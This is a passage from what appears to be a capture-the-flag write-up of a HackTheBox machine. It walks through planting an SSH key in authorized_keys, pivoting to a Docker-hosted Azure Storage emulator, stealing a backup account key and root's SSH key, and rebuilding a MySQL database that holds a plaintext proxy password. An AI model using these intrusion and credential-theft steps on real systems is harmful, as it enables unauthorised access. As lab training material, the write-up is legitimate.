drwx------  2 oxdf oxdf 4096 Dec  7 14:54 .ssh
-r--------  1 oxdf oxdf   33 Feb  7  2022 user.txt

```

I’ll write my public key into the `authorized_keys` file:

```

root@hacky:/mnt/.ssh# ls
authorized_keys
root@hacky:/mnt/.ssh# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys 

```

Now I can connect as jennifer:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen jennifer@10.10.11.131
Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jennifer@flustered:~$ 

```

## Shell as root

### Enumeration

#### General

There’s not much else on this host to find. jennifer’s home directory is relatively empty. The `netstat` doesn’t show any additional open ports (other than 3306, MySQL, which I don’t have creds for).

`/proc` is mounted with `hidepid=2`, which means that I can only see processes running as jennifer:

```

jennifer@flustered:~$ mount
...[snip]...
proc on /proc type proc (rw,relatime,hidepid=2)
...[snip]...
jennifer@flustered:~$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
jennifer  2365  0.0  0.2  21156  9120 ?        Ss   21:44   0:00 /lib/systemd/systemd --user
jennifer  2381  0.0  0.1   7916  4716 pts/1    Ss   21:44   0:00 -bash
jennifer  2475  0.0  0.0  10632  3188 pts/1    R+   21:58   0:00 ps auxww

```

`ip addr` does give a clue:

```

jennifer@flustered:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:6e:0d brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.131/24 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:6e0d/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:6e0d/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:09:b0:be:12 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9ff:feb0:be12/64 scope link 
       valid_lft forever preferred_lft forever
5: veth2727a43@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 72:3c:7c:3b:37:d8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::703c:7cff:fe3b:37d8/64 scope link 
       valid_lft forever preferred_lft forever

```

There’s a docker interface on 172.17.0.1/16!

#### Identify Container

I’ll use my favorite ping sweep to instantly identify two hosts on this /24:

```

jennifer@flustered:~$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.052 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.051 ms

```
172.17.0.2 must be a container.

#### Port Scan Container

To see what’s open on the container, I can use `nc` to port scan:

```

jennifer@flustered:~$ time nc -zvn 172.17.0.2 1-65535
(UNKNOWN) [172.17.0.2] 10000 (webmin) open

real    0m8.604s
user    0m5.976s
sys     0m2.601s

```

It finds a single open port, 10000.

#### TCP 10000

This port does reply to `curl`, but with an error message:

```

jennifer@flustered:~$ curl 172.17.0.2:10000
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Error>
  <Code>InvalidQueryParameterValue</Code>
  <Message>Value for one of the query parameters specified in the request URI is invalid.
RequestId:698ed843-6083-4d9d-a123-240343e034e8
Time:2022-02-07T23:09:10.495Z</Message>
</Error>

```

Throwing parts of that error message into Google, the top hits are about Azure Storage:

![image-20220207180724177](https://0xdfimages.gitlab.io/img/image-20220207180724177.png)

### Azure Storage Explorer Connection

#### Tunnel

In order to get a connection to the Azure Storage emulator running on the docker container, I’ll create an SSH tunnel that forwards port 10000 on my host to 10000 on 172.17.0.2:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
...[snip]...

```

Alternatively, I could do that from within an existing SSH session by hitting enter a couple times, then `~C` to drop to an SSH prompt:

```

jennifer@flustered:~$ 
ssh> 

```

I can enter the same forward there:

```

ssh> -L 10000:172.17.0.2:10000
Forwarding port.

jennifer@flustered:~$

```

#### Connection Fail

One of the links there was for the [Azure Storage Explorer](https://docs.microsoft.com/en-us/azure/vs-azure-tools-storage-manage-with-storage-explorer?tabs=linux). I’ll install with `snap`, and run the pre-req command that’s required according to the docs:

```

oxdf@hacky$ sudo snap install storage-explorer
storage-explorer 1.22.1 from Microsoft Azure Storage Tools (msft-storage-tools✓) installed
oxdf@hacky$ snap connect storage-explorer:password-manager-service :password-manager-service

```

In the window that comes up, all the options are for the actual Azure service in the cloud, except for the last one, “Local storage emulator”:

![image-20220207181920581](https://0xdfimages.gitlab.io/img/image-20220207181920581.png)

Clicking that, the next form requests data about the connection. I don’t have an “Account Key”, but I can try to create the connection with that empty, updating the “Display name” and the “Account name”:

![image-20220207203717521](https://0xdfimages.gitlab.io/img/image-20220207203717521.png)

Clicking “Next” shows the result:

![image-20220207203832057](https://0xdfimages.gitlab.io/img/image-20220207203832057.png)

It’s interesting that it created a key anyway.

When I click “Next”, it shows “flustered” in the “Storage Accounts” section:

![image-20220207203929373](https://0xdfimages.gitlab.io/img/image-20220207203929373.png)

If I expand anything in there and try to view it, an error pops up:

![image-20220207203956895](https://0xdfimages.gitlab.io/img/image-20220207203956895.png)

It’s complaining about lack of auth.

#### Find Key

Looking for files owned by Jennifer, there’s not that many:

```

jennifer@flustered:~$ find / -group jennifer 2>/dev/null | grep -v -e "^/sys" -e "^/run" -e "^/proc"
/var/backups/key
/gluster/bricks/brick1/vol1
/gluster/bricks/brick1/vol1/.ssh
/gluster/bricks/brick1/vol1/.ssh/authorized_keys
/gluster/bricks/brick1/vol1/user.txt
/gluster/bricks/brick1/vol1/.bash_logout
/gluster/bricks/brick1/vol1/.bashrc
/gluster/bricks/brick1/vol1/.gnupg
/gluster/bricks/brick1/vol1/.gnupg/private-keys-v1.d
/gluster/bricks/brick1/vol1/.profile
/gluster/bricks/brick1/vol1/.bash_history
/home/jennifer
/home/jennifer/.ssh
/home/jennifer/.ssh/authorized_keys
/home/jennifer/user.txt
/home/jennifer/.bash_logout
/home/jennifer/.bashrc
/home/jennifer/.gnupg
/home/jennifer/.gnupg/private-keys-v1.d
/home/jennifer/.profile
/home/jennifer/.bash_history

```

I’ve already looked at the home directory and the `gluster` stuff. But there’s a `key` in `/var/backups`:

```

jennifer@flustered:~$ ls -l /var/backups/key 
-rw-r----- 2 root jennifer 89 Oct 26 12:12 /var/backups/key
jennifer@flustered:~$ cat /var/backups/key
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==

```

That looks similar to the one from Storage Explorer.

#### Connect Success

I’ll remove the bad connection, and right click on “Storage Accounts” and select “Connect to Azure Storage…” to get that original form back:

![image-20220207204357186](https://0xdfimages.gitlab.io/img/image-20220207204357186.png)

After selecting “Local storage emulator”, I’ll fill the form out the same, but this time with the key in “Account key”:

![image-20220207204448715](https://0xdfimages.gitlab.io/img/image-20220207204448715.png)

On hitting connect, “flustered” is back in the list. This time, expanding “Blob Containers” shows two sub folders:

![image-20220207204533505](https://0xdfimages.gitlab.io/img/image-20220207204533505.png)

### SSH

#### Download Key

“ssh-keys” is a very attractive folder. Clicking on it loads two files:

![image-20220207204618343](https://0xdfimages.gitlab.io/img/image-20220207204618343.png)

Clicking on “root.key” and then “Download” pops a dialog to download it to my system. Interestingly, trying to write to my home directory fails:

![image-20220208055925139](https://0xdfimages.gitlab.io/img/image-20220208055925139.png)

Clicking on the “Open” button (or double clicking on the key) downloads but then fails to open it. Still, I can see where it downloaded and copy it from there:

![image-20220208060143939](https://0xdfimages.gitlab.io/img/image-20220208060143939.png)

Alternatively, I can download it to `/tmp`:

![image-20220208060223712](https://0xdfimages.gitlab.io/img/image-20220208060223712.png)

I’ll just need to know that to find it, it’s not in `/tmp` directly, but rather in one of the snap sandboxes in `/tmp`, and owned by root:

```

oxdf@hacky$ sudo find /tmp/ -name root.key
/tmp/snap.storage-explorer/tmp/root.key

```

#### Shell

With the key, I can connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/flustered-root root@flustered
...[snip]...
root@flustered:~#

```

And grab `root.txt`:

```

root@flustered:~# cat root.txt
a5acbdbd************************

```

## Beyond Root

### Squid Localhost

I wanted to figure out why visiting `localhost` via the Squid proxy was failing, so here’s a [video](https://www.youtube.com/watch?v=To8v3rbTUB0) exploring that:

In summary:
- It’s failing because it’s trying to resolve `localhost` as `::1`, which is the IPv6 equivalent to 127.0.0.1, and NGINX isn’t listening on that interface.
- I can remove the connection in `/etc/hosts` and it works (after restarting `squid`).
- I can also re-order `/etc/hosts`, and it works. This is weird. I can’t explain this, unless Squid just reads bottom to top unlike every other user of `hosts`.
- Finally, I’ll enable NGINX to listen on that interface, which fixes it as well.

### Recreate MySQL DB

With all the files from `/var/lib/mysql`, I can recreate the MySQL database locally. To avoid stomping over any config I have on my current machine, I’ll use Docker.

I’ll copy all the files from `/mnt` into a temp directory, `/tmp/flustered`. `mysql_upgrade_info` gives the MariaDB version:

```

oxdf@hacky$ cat mysql_upgrade_info 
10.3.31-MariaDB

```

I’ll start the container with the file system from Flustered mapped into the host as `/var/lib/mysql`:

```

oxdf@hacky$ docker run -v /tmp/flustered/:/var/lib/mysql -d mariadb:10.3.21
Unable to find image 'mariadb:10.3.21' locally
10.3.21: Pulling from library/mariadb
5c939e3a4d10: Pull complete 
c63719cdbe7a: Pull complete 
19a861ea6baf: Pull complete 
651c9d2d6c4f: Pull complete 
077e14009561: Pull complete 
5f038f59a326: Pull complete 
1b0216466f21: Pull complete 
1b0570aa273a: Pull complete 
07d05628c2aa: Pull complete 
8f2f7d8e5cbd: Pull complete 
4bc4c61e3649: Pull complete 
4c548c48b213: Pull complete 
7fe8d44af9db: Pull complete 
81c99340ab77: Pull complete 
Digest: sha256:c17415dd78fc9967e64cae314114173f1e9ca5cba4cbf2bf9c937d587fc38434
Status: Downloaded newer image for mariadb:10.3.21
6aa5053911d3a065069e0672f6075d6256906e27f5f23c8555802bb6e8891bc0

```

Next I can see it’s running, and drop into the container:

```

oxdf@hacky$ sudo docker ps
CONTAINER ID   IMAGE             COMMAND                  CREATED         STATUS         PORTS      NAMES
6aa5053911d3   mariadb:10.3.21   "docker-entrypoint.s…"   6 seconds ago   Up 4 seconds   3306/tcp   stoic_noether
oxdf@hacky$ sudo docker exec -it stoic_noether bash
root@6aa5053911d3:/#

```

When I try to connect to the database, it complains that the `unix_socket` plugin is not loaded:

```

root@6aa5053911d3:/# mysql
ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded

```

I could connect via TCP, but a password would be needed, and I don’t have it. The solution is to enable the `unix_socket` plugin. [This post](https://unix.stackexchange.com/questions/420530/error-1524-hy000-plugin-unix-socket-is-not-loaded-mysql) suggests I could enable the plugin in `/etc/mysql/mariadb.conf.d/50-server.cnf`. There are no files in that directory in the container:

```

root@6aa5053911d3:/# ls /etc/mysql/mariadb.conf.d/   

```

So that I don’t have to mess with stopping and starting the service, I’ll create a new container that has the config mapped into it:

```

oxdf@hacky$ echo -e "[mysqld]\nplugin-load-add = auth_socket.so" > /tmp/unix_socket.cnf 

```

Now I can start the container with that file mapped into place, and then access the database:

```

oxdf@hacky$ docker run -v /tmp/unix_socket.cnf:/etc/mysql/mariadb.conf.d/unix_socket.cnf -v /tmp/flustered:/var/lib/mysql -d mariadb:10.3.31
3ef7ef087e1132c496e64f0f6e548fcafd56b3ab83bb0ec199b68916d462b724
oxdf@hacky$ docker exec -it 3e bash
root@3ef7ef087e11:/# mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.3.31-MariaDB-1:10.3.31+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>

```

One thing to note - there there are multiple MariaDB containers running at the same time, it may return an error when trying to run `mysql`:

```

root@f8056b5a6490:/# mysql
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)

```

Kill all the other containers (`docker kill [id]`) and then try again.

With access to the DB, I can enumerate. Only one non-default table:

```

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| squid              |
+--------------------+
4 rows in set (0.000 sec)

```

Only one table:

```

MariaDB [(none)]> use squid
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [squid]> show tables;
+-----------------+
| Tables_in_squid |
+-----------------+
| passwd          |
+-----------------+
1 row in set (0.000 sec)

MariaDB [squid]> describe passwd;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| user     | varchar(32) | NO   | PRI |         |       |
| password | varchar(35) | NO   |     |         |       |
| enabled  | tinyint(1)  | NO   |     | 1       |       |
| fullname | varchar(60) | YES  |     | NULL    |       |
| comment  | varchar(60) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
5 rows in set (0.001 sec)

```

The table has the same information I was able to pull with `strings` above:

```

MariaDB [squid]> select * from passwd;
+----------------+---------------+---------+----------------+---------+
| user           | password      | enabled | fullname       | comment |
+----------------+---------------+---------+----------------+---------+
| lance.friedman | o>WJ5-jD<5^m3 |       1 | Lance Friedman |         |
+----------------+---------------+---------+----------------+---------+
1 row in set (0.000 sec)

```